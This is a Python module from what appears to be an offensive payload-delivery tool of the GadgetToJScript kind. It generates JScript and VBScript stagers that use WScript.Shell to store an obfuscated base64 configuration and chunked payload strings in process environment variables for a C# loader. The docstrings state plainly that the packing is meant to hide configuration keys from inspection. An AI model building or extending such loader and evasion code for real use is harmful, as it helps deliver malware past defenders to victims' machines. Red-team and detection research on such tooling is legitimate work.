import base64
from typing import List, Dict

class BaseStager:
    """
    Abstract base class for Stagers.
    
    A Stager is responsible for generating the code snippet that sets up the
    environment variables required by the C# loader (e.g., configuration and payload chunks).
    """
    
    def generate_code(self, payload_string: str, metadata: dict, config_var_name: str = "G2JS_CFG") -> str:
        """
        Generates the staging code.

        Args:
            payload_string: The full payload string (encoded/compressed).
            metadata: A dictionary of configuration options (e.g., {'ENCODING': 'base64'}).
            config_var_name: The name of the environment variable to store the packed configuration.

        Returns:
            The source code for the stager.
        """
        raise NotImplementedError

    def _chunk_string(self, string: str, length: int) -> List[str]:
        """
        Splits a string into fixed-length chunks.
        Needed because environment variables have size limits on some systems/contexts.
        """
        return [string[i:i+length] for i in range(0, len(string), length)]

    def _pack_metadata(self, metadata: dict) -> str:
        """
        Packs metadata into a single obfuscated string.

        Format: Base64(KEY=VALUE;KEY2=VALUE2)
        
        Why: 
        1. Reduces the number of visible environment variables.
        2. Obfuscates the configuration keys so they aren't immediately readable strings in the script.
        """
        # 1. Serialize: KEY=VALUE;KEY2=VALUE2
        packed = ";".join([f"{k}={v}" for k, v in metadata.items()])
        # 2. Encode: Base64
        return base64.b64encode(packed.encode('utf-8')).decode('utf-8')

class JScriptStager(BaseStager):
    """
    Stager implementation for JScript (ECMAScript 3 compatible).
    """
    
    def generate_code(self, payload_string: str, metadata: dict, config_var_name: str = "G2JS_CFG") -> str:
        # Escape backslashes and single quotes to prevent syntax errors in the JScript string literal.
        payload_string = payload_string.replace("\\", "\\\\").replace("'", "\\'")
        chunks = self._chunk_string(payload_string, 2048)
        
        encoded_config = self._pack_metadata(metadata)
        
        stager = "// [STAGER BLOCK START]\n"
        stager += "try {\n"
        stager += "    var g2jsStagerSh = new ActiveXObject('WScript.Shell');\n"
        stager += "    var g2jsStagerEnv = g2jsStagerSh.Environment('Process');\n"
        
        # Set the packed configuration variable
        stager += f"    g2jsStagerEnv('{config_var_name}') = '{encoded_config}';\n"

        # Set the payload chunks (G2JS_PL_0, G2JS_PL_1, ...)
        for i, chunk in enumerate(chunks):
            stager += f"    g2jsStagerEnv('G2JS_PL_{i}') = '{chunk}';\n"
            
        stager += "} catch(e) { }\n"
        stager += "// [STAGER BLOCK END]\n\n"
        return stager

class VBScriptStager(BaseStager):
    """
    Stager implementation for VBScript.
    """
    
    def generate_code(self, payload_string: str, metadata: dict, config_var_name: str = "G2JS_CFG") -> str:
        # Escape double quotes by doubling them (" -> "") for VBScript string literals.
        payload_string = payload_string.replace("\"", "\"\"")
        chunks = self._chunk_string(payload_string, 2048)
        
        encoded_config = self._pack_metadata(metadata)
        
        stager = "' [STAGER BLOCK START]\n"
        stager += "Dim g2jsSh, g2jsEnv\n"
        stager += "Set g2jsSh = CreateObject(\"WScript.Shell\")\n"
        stager += "Set g2jsEnv = g2jsSh.Environment(\"Process\")\n"

        # Set the packed configuration variable
        stager += f"g2jsEnv(\"{config_var_name}\") = \"{encoded_config}\"\n"

        # Set the payload chunks
        for i, chunk in enumerate(chunks):
            stager += f"g2jsEnv(\"G2JS_PL_{i}\") = \"{chunk}\"\n"
            
        stager += "' [STAGER BLOCK END]\n\n"
        return stager